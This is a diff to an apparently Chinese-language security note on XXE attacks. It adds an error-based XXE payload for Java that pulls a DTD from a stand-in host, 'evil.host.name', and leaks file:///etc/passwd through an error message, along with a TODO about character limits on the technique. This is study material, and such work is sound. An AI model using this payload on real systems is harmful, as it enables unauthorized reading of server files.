@@ -379,7 +379,31 @@
 <message>any text</message>
 ```
 
-* o2oa的实战案例
+* 在java环境下，需要找到一个本地或者远程可访问的dtd地址
+
+```java
+<?xml version="1.0" ?>
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "http://evil.host.name/include.dtd">
+
+    <!ENTITY % test 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message>any text</message>
+```
+
+```dtd
+<!ENTITY % test "example">
+<!ELEMENT pattern (%test;)>
+```
+
+* TODO（这里原理有待研究一下，实践中读取的文件不能包括% &等一些特殊符号，对利用有一定影响）
 
 ### 补充
 
